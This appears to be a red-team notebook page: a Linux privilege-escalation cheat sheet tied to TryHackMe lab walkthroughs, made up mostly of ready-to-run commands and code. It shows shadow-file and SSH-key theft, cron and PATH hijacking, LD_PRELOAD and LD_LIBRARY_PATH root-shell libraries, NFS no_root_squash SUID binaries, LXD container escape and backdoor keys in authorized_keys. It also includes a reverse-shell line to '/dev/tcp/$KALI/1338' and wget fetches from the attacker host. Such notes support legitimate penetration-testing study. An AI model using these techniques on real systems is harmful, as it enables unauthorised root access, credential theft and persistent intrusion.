# Linux

## **Gathering Info**

```
whoami
id
groups
```

```
uname -a
```

Check for passwords in environment variables

```
env
```

## Find files

Files owned by your user

**Victim**

```
find / -user $USER 2>/dev/null
```

Files owned by group

**Victim**

```
find / -type f -group $GROUP 2>/dev/null
```

Find passwords

```
cat /etc/passwd
cat /etc/shadow
cat /var/www/html/wpconfig.php #Wordpress sites
```

##

## Weak File Permissions

### Readable /etc/shadow

[#weak-file-permissions-readable-etc-shadow](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-readable-etc-shadow "mention")

### Writable /etc/shadow

[#weak-file-permissions-writable-etc-shadow](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-writable-etc-shadow "mention")

### Writable /etc/passwd

[#weak-file-permissions-writable-etc-passwd](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-writable-etc-passwd "mention")



## Cron Jobs



| Finding & Comments                                                 | Example                                                                                                     |
| ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| Have permission to overwrite the contents of the file              | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
| Change path to a different file since it's not using absolute path | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
|                                                                    |                                                                                                             |

**Victim**

```
cat /etc/crontab
```

Possible other places crons are running

**Victim**

```
cat /etc/cron.d/*
```

### Cron Jobs - File Permissions

**Examples**

[#cron-jobs-file-permissions](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-file-permissions "mention")

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab.

**Victim**

```
cat /etc/crontab
```



<figure><img src="../../../../.gitbook/assets/image (44) (1) (2).png" alt=""><figcaption></figcaption></figure>

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file.

**Victim**

```
locate overwrite.sh
```

Note that the file is world-writable.

**Victim**

```
ls -l /usr/local/bin/overwrite.sh
```

### Cron Jobs - PATH Environment Variable

**Examples**

[#cron-jobs-path-environment-variable](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-path-environment-variable "mention")

View the contents of the system-wide crontab

**Victim**

```
cat /etc/crontab
```

Note that the PATH variable starts with /home/user which is our user's home directory. Create a file called overwrite.sh in your home directory with the following contents

<figure><img src="../../../../.gitbook/assets/image (29) (3).png" alt=""><figcaption></figcaption></figure>

#### overwrite.sh

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable

**Victim**

```
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

**Victim**

```
/tmp/rootbash -p
```

### Cron Jobs - Wildcards

**Examples**

[#cron-jobs-wildcards](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-wildcards "mention")

View the contents of the other cron job script

**Victim**

```
cat /usr/local/bin/compress.sh
```

<figure><img src="../../../../.gitbook/assets/image (10) (1) (2) (1) (2).png" alt=""><figcaption></figcaption></figure>

Note that the tar command is being run with a wildcard (\*) in your home directory.



## Sudo/SUID/Capabilities <a href="#user-content-sudosuidcapabilities" id="user-content-sudosuidcapabilities"></a>

Run all of these commands then check [https://gtfobins.github.io/](https://gtfobins.github.io/) . They may give different results

Check what can be run with NOPASSWD

**Victim**

```
sudo -l
```



| Finding                     | Comments             | Examples                                                                                                                                                                                                                                                                                                                                                             |
| --------------------------- | -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| yum                         | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention")                                                                                                                                                                                                                                                                                        |
| anansi\_util                | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")                                                                                                                                                                                                                                                                                          |
| vi                          |                      | [#escaping-vi-editor](../../../../walkthroughs/tryhackme/common-linux-privesc.md#escaping-vi-editor "mention") [#privilege-escalation](../../../../walkthroughs/tryhackme/year-of-the-rabbit.md#privilege-escalation "mention")[#privilege-escalation](../../../../walkthroughs/tryhackme/chocolate-factory.md#privilege-escalation "mention")                       |
| BASH scripts                |                      | [chill-hack.md](../../../../walkthroughs/tryhackme/chill-hack.md "mention")[#privilege-escalation](../../../../walkthroughs/tryhackme/wekor.md#privilege-escalation "mention")                                                                                                                                                                                       |
| chmod                       |                      | [#privilege-escalation-option-3-chmod](../../../../walkthroughs/tryhackme/colddbox-easy.md#privilege-escalation-option-3-chmod "mention")                                                                                                                                                                                                                            |
| apache2                     |                      | [#apache2](../../../../walkthroughs/tryhackme/linux-privesc.md#apache2 "mention")                                                                                                                                                                                                                                                                                    |
| nmap                        |                      | [#nmap](../../../../walkthroughs/tryhackme/linux-privesc.md#nmap "mention")                                                                                                                                                                                                                                                                                          |
| ftp                         |                      | [#ftp](../../../../walkthroughs/tryhackme/linux-privesc.md#ftp "mention")[#privilege-escalation-option-2-ftp](../../../../walkthroughs/tryhackme/colddbox-easy.md#privilege-escalation-option-2-ftp "mention")                                                                                                                                                       |
| more                        |                      | [#more](../../../../walkthroughs/tryhackme/linux-privesc.md#more "mention")                                                                                                                                                                                                                                                                                          |
| less                        |                      | [#less](../../../../walkthroughs/tryhackme/linux-privesc.md#less "mention")[#privlege-escalation](../../../../walkthroughs/tryhackme/brooklyn-nine-nine.md#privlege-escalation "mention")                                                                                                                                                                            |
| awk                         |                      | [#awk](../../../../walkthroughs/tryhackme/linux-privesc.md#awk "mention")                                                                                                                                                                                                                                                                                            |
| man                         |                      | [#man](../../../../walkthroughs/tryhackme/linux-privesc.md#man "mention")                                                                                                                                                                                                                                                                                            |
| vim                         |                      | [#vim](../../../../walkthroughs/tryhackme/linux-privesc.md#vim "mention")[#privilege-escalation-option-1-vim](../../../../walkthroughs/tryhackme/colddbox-easy.md#privilege-escalation-option-1-vim "mention")                                                                                                                                                       |
| find                        |                      | <p><a data-mention href="../../../../walkthroughs/tryhackme/linux-privesc.md#find">#find</a><a data-mention href="../../../../walkthroughs/tryhackme/boiler-ctf.md#privilege-escalation">#privilege-escalation</a></p><p><a data-mention href="../../../../walkthroughs/tryhackme/linux-privilege-escalation.md">linux-privilege-escalation.md</a></p>               |
|                             |                      |                                                                                                                                                                                                                                                                                                                                                                      |
| iftop                       |                      | [#iftop](../../../../walkthroughs/tryhackme/linux-privesc.md#iftop "mention")                                                                                                                                                                                                                                                                                        |
| sudo                        |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/agent-sudo.md#privilege-escalation "mention")                                                                                                                                                                                                                                                             |
| cat                         |                      | [brute-it.md](../../../../walkthroughs/tryhackme/brute-it.md "mention")[dav.md](../../../../walkthroughs/tryhackme/dav.md "mention")                                                                                                                                                                                                                                 |
| pkexec                      |                      | [lian\_yu.md](../../../../walkthroughs/tryhackme/lian\_yu.md "mention")                                                                                                                                                                                                                                                                                              |
| nano                        |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/gallery.md#privilege-escalation "mention")                                                                                                                                                                                                                                                                |
| certutil                    | Read files           | [#tcp-22-ssh](../../../../walkthroughs/tryhackme/b3dr0ck.md#tcp-22-ssh "mention")                                                                                                                                                                                                                                                                                    |
| <p>base64 </p><p>base32</p> | Read files           | [b3dr0ck.md](../../../../walkthroughs/tryhackme/b3dr0ck.md "mention")                                                                                                                                                                                                                                                                                                |
| env                         |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/dogcat.md#privilege-escalation "mention")                                                                                                                                                                                                                                                                 |
| pico                        |                      | [#lateral-movement](../../../../walkthroughs/tryhackme/madeyes-castle/#lateral-movement "mention")                                                                                                                                                                                                                                                                   |
| flask                       |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/haskhell.md#privilege-escalation "mention")                                                                                                                                                                                                                                                               |
| python3                     |                      | [#lateral-movement-will](../../../../walkthroughs/tryhackme/watcher.md#lateral-movement-will "mention")[wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")[#tcp-22-ssh](../../../../walkthroughs/tryhackme/tokyo-ghoul.md#tcp-22-ssh "mention")[#tcp-7321-script](../../../../walkthroughs/tryhackme/peak-hill.md#tcp-7321-script "mention") |
| tar                         |                      | [#lateral-movement](../../../../walkthroughs/tryhackme/the-marketplace.md#lateral-movement "mention")[#privilege-escalation](../../../../walkthroughs/tryhackme/vulnnet.md#privilege-escalation "mention")                                                                                                                                                           |
| reboot                      |                      | [#initial-access](../../../../walkthroughs/tryhackme/looking-glass.md#initial-access "mention")                                                                                                                                                                                                                                                                      |
| bash                        |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/looking-glass.md#privilege-escalation "mention")                                                                                                                                                                                                                                                          |
| ALL                         |                      | [#lateral-movement](../../../../walkthroughs/tryhackme/biteme.md#lateral-movement "mention")                                                                                                                                                                                                                                                                         |
| fail2ban                    |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/biteme.md#privilege-escalation "mention")                                                                                                                                                                                                                                                                 |
| exiftool                    |                      | [#privilege-escalation](../../../../walkthroughs/tryhackme/cmspit.md#privilege-escalation "mention")                                                                                                                                                                                                                                                                 |

### SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables.

**Victim**

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```



| Finding | Comments                                    | Examples                                                                                                                                    |
| ------- | ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| exim    | version 4.84-3                              | [#suid-sgid-executables-known-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-known-exploits "mention") |
| base64  | Read files we shouldn't have access to read | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention")                                 |
| find    | Privilege Escalation                        | [#privilege-escalation](../../../../walkthroughs/tryhackme/expose.md#privilege-escalation "mention")                                        |
| python3 |                                             | [#privilege-escalation](../../../../walkthroughs/tryhackme/annie.md#privilege-escalation "mention")                                         |



### SUID / SGID Executables - Shared Object Injection

[#suid-sgid-executables-shared-object-injection](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-shared-object-injection "mention")



### SUID / SGID Executables - Environment Variables

[#suid-sgid-executables-environment-variables](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-environment-variables "mention")



### SUID / SGID Executables - Abusing Shell Features

[#suid-sgid-executables-abusing-shell-features-1](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-abusing-shell-features-1 "mention")

[#suid-sgid-executables-abusing-shell-features-2](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-abusing-shell-features-2 "mention")

## Sudo - Environment Variables

### LD\_LIBRARY\_PATH

**Examples**

[#sudo-environment-variables](../../../../walkthroughs/tryhackme/linux-privesc.md#sudo-environment-variables "mention")

#### preload.c - code

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

#### library\_path.c

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Sudo can be configured to inherit certain environment variables from the user's environment. Check which environment variables are inherited (look for the env\_keep options):

**Victim**

```
sudo -l
```

<figure><img src="../../../../.gitbook/assets/image (32) (3) (1).png" alt=""><figcaption></figcaption></figure>

**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c.

**Victim**

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c

**Victim**

```
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
```

<figure><img src="../../../../.gitbook/assets/image (31) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program.

**Victim**

```
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.

**Victim**

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

<figure><img src="../../../../.gitbook/assets/image (8) (8).png" alt=""><figcaption></figcaption></figure>

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.

**Victim**

<pre><code><strong>sudo LD_LIBRARY_PATH=/tmp apache2
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>



### **LD\_PRELOAD**

**Examples**

[road.md](../../../../walkthroughs/tryhackme/road.md "mention")

If LD\_PRELOAD is set try below then running the script we can run with NOPASSWD

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
vi preload.c
```

**preload.c - code**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```

**Victim**

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so $NOPASSWD_SCRIPT_WE_CAN_ABUSE
```



## **Files with SUID-bit set**

**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
```

| Finding                       | Comments                                                                                                            | Examples                                                                                                                                                                                                                                                                                                     |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| setcap                        | If setcap is set that is very interesting checkout room. Could lead to priv esc. by setting getcap on other things. | [annie.md](../../../../walkthroughs/tryhackme/annie.md "mention")                                                                                                                                                                                                                                            |
| Programs in strange locations | If there is a program running in a user home directory or somewhere strange, it may be worth investigating          | <p><a data-mention href="../../../../walkthroughs/tryhackme/common-linux-privesc.md">common-linux-privesc.md</a><a data-mention href="../../../../walkthroughs/tryhackme/madeyes-castle/">madeyes-castle</a> <br><a data-mention href="../../../../walkthroughs/tryhackme/containme.md">containme.md</a></p> |
| find                          | Can spawn shell                                                                                                     | [boiler-ctf.md](../../../../walkthroughs/tryhackme/boiler-ctf.md "mention")                                                                                                                                                                                                                                  |
| doas                          | Can read files or copy files                                                                                        | [glitch.md](../../../../walkthroughs/tryhackme/glitch.md "mention")                                                                                                                                                                                                                                          |
| strings                       | Can read files                                                                                                      | [jack-of-all-trades.md](../../../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")                                                                                                                                                                                                                  |
| cputils                       | Can copy files                                                                                                      | [olympus.md](../../../../walkthroughs/tryhackme/olympus.md "mention")                                                                                                                                                                                                                                        |
| tar                           | Can spawn shell                                                                                                     | [skynet.md](../../../../walkthroughs/tryhackme/skynet.md "mention")                                                                                                                                                                                                                                          |

## Getcap

**Victim**

```
getcap -r / 2>/dev/null
```

| Finding | Comments                                                                                                                                                                                                             | Examples                                                                                                    |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| python  | If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. | [oh-my-webserver.md](../../../../walkthroughs/tryhackme/oh-my-webserver.md "mention")                       |
| vim     | Can spawn shell                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
| perl    | Can spawn shell                                                                                                                                                                                                      | [wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")                                 |
| openssl | Can spawn shell                                                                                                                                                                                                      | [mindgames.md](../../../../walkthroughs/tryhackme/mindgames.md "mention")                                   |
| vim     |                                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |



## **Service Exploits**

| Finding | Comments | Examples                                                                                            |
| ------- | -------- | --------------------------------------------------------------------------------------------------- |
| mysql   |          | [#service-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#service-exploits "mention") |
|         |          |                                                                                                     |
|         |          |                                                                                                     |





## PATH Variables

**Examples**

[hacker-vs.-hacker.md](../../../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")[#exploiting-crontab](../../../../walkthroughs/tryhackme/common-linux-privesc.md#exploiting-crontab "mention")

Look at the paths, below is an example of a cronjob. it first looks at /home/lachlan/bin before /bin and /usr/bin. therefore we can change pkill because it doesn't use the exact path in the cronjob. This means we can put a new file called /home/lachlan/bin/pkill with whatever we want and it will run as root.

**Victim**

```
cat /etc/crontab
```

Possible other places crons are running

**Victim**

```
cat /etc/cron.d/*
```

<figure><img src="../../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

**Victim(lachlan)**

```
echo "bash -c 'bash -i >& /dev/tcp/$KALI/1338 0>&1'" > /home/lachlan/bin/pkill ; chmod  +x bin/pkill
```



### **Add path**

**Example**

[#exploiting-path-variable](../../../../walkthroughs/tryhackme/common-linux-privesc.md#exploiting-path-variable "mention")

If a cron job is not specfiying the full path we may be able to change it to go towards another file.

Before we change the path we can see ls goes to /bin/ls

![](<../../../../.gitbook/assets/image (8) (7) (1).png>)

Now after running the below command ls is now directed to our script.

**Victim**

```
export PATH=/tmp:$PATH
```

<figure><img src="../../../../.gitbook/assets/image (14) (3) (1).png" alt=""><figcaption></figcaption></figure>

## Passwords & Keys&#x20;

### History Files

**Examples**

[#passwords-and-keys-history-files](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-history-files "mention")

**Victim**

```
cat ~/.*history | less
```

### Config Files

**Examples**

[#passwords-and-keys-config-files](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-config-files "mention")

**Victim**

```
cat /home/user/myvpn.ovpn
```

### SSH Keys

### Copy keys from Victim

**Examples**

[#passwords-and-keys-ssh-keys](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-ssh-keys "mention")

Look for hidden files & directories in the system root.

**Victim**

```
cat /home/$USER/.ssh/$KEY
```

Copy the key over to your Kali box (it's easier to just view the contents of the $KEY file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it.

**Kali**

<pre><code><strong>chmod 600 $KEY
</strong><strong>ssh -i $KEY -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa $USER@$VICTIM
</strong></code></pre>



### **Add Keys to Victim**

**Examples**

[madeyes-castle](../../../../walkthroughs/tryhackme/madeyes-castle/ "mention")

**Kali**

```
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub 
```

<figure><img src="../../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo "$YOURKEY" >> /home/$USER/.ssh/authorized_keys
```

**Kali**

```
ssh $USER@$VICTIM
```



## NFS

**Examples**

[#nfs](../../../../walkthroughs/tryhackme/linux-privesc.md#nfs "mention")[linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention")

### Option #1

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM.

**Victim**

<pre><code><strong>cat /etc/exports
</strong></code></pre>

no\_root\_squash is present

<figure><img src="../../../../.gitbook/assets/image (1) (6) (3).png" alt=""><figcaption></figcaption></figure>

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root.

**Kali**

```
sudo su
```

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly).

**Kali**

```
mkdir /tmp/nfs
mount -o rw,vers=3 $VICTIM:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash).

**Kali**

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Still using Kali's root user, make the file executable and set the SUID permission.

**Kali**

```
chmod +xs /tmp/nfs/shell.elf
```

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell.

**Victim**

```
/tmp/shell.elf
```

<figure><img src="../../../../.gitbook/assets/image (7) (7) (1).png" alt=""><figcaption></figcaption></figure>

### Option #2

**Victim**

```
showmount -e $VICTIM
cat /etc/exports
```

<figure><img src="../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (11) (11).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
mkdir /root/attack
mount -o rw $VICTIM:/home/ubuntu/sharedfolder /root/attack
subl /root/attack/nfc.c
```

**nfc.c**

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

**Kali**

```
gcc /root/attack/nfc.c -o /root/attack/nfc -w
chmod +s /root/attack/nfc
```

**Victim**

```
cd /home/ubuntu/sharedfolder
./nfc
```

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>



## Kernel Exploits

**Examples**

[#kernel-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#kernel-exploits "mention")

## Writable Files

**Files where group permissions equal to "writable"**

```
find / -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```

```
find / -writable 2>/dev/null
```



## **Ports**

May be able to find open ports only accessible internally.&#x20;

```
ss -ltp
netstat -tuan
```



### LXD&#x20;

**Examples**

[anonymous.md](../../../../walkthroughs/tryhackme/anonymous.md "mention")[gamingserver.md](../../../../walkthroughs/tryhackme/gamingserver.md "mention")

**Resources**

[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

**Victim**

```
id
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python2 -m SimpleHTTPServer 81
```

**Note:** The command lxd init was to resolve a storage pool area issue, it may not always be needed.

**Victim**

```
cd /tmp
wget http://$KALI:81/alpine-v3.18-x86_64-20231111_1929.tar.gz
lxc image import ./alpine-v3.18-x86_64-20231111_1929.tar.gz --alias myimage
lxd init
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```



## PolKit

**Examples:** [hip-flask.md](../../../../walkthroughs/tryhackme/hip-flask.md "mention")

See if it exists.

**Kali**

```
apt list --upgradeable
```

<figure><img src="../../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

Check out this room for more details

{% embed url="https://tryhackme.com/r/room/polkit" %}

##

## Monitor Processes

**Examples**

[enumeration.md](../../../../walkthroughs/tryhackme/enumeration.md "mention")

**Victim**

```
ps axf
```



### PSPY

script that can monitor linux processes without root access

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32 
```





## Docker Breakout / Privilege Escalation

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" %}

**Examples**

[ultratech.md](../../../../walkthroughs/tryhackme/ultratech.md "mention")

[dogcat.md](../../../../walkthroughs/tryhackme/dogcat.md "mention")

[the-marketplace.md](../../../../walkthroughs/tryhackme/the-marketplace.md "mention")

[chill-hack.md](../../../../walkthroughs/tryhackme/chill-hack.md "mention")

Copy Material from here:

[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)



## **Automated Enumeration Tools**

| Name                          | Link                                                                                                                                                                                           | Examples                                                                |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| LinPeas                       | [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) | [internal.md](../../../../walkthroughs/tryhackme/internal.md "mention") |
| LinEnum                       | [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)                                                                                                                 |                                                                         |
| LES (Linux Exploit Suggester) | [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)                                                                                           |                                                                         |
| Linux Smart Enumeration       | [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)                                                                           |                                                                         |
| Linux Priv Checker            | [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)                                                                                                       |                                                                         |



## Room with other things to try

[https://jeffgthompsons-organization.gitbook.io/red-team/walkthroughs/tryhackme/linux-privesc](https://jeffgthompsons-organization.gitbook.io/red-team/walkthroughs/tryhackme/linux-privesc)

## Other Cheat sheets

[https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)

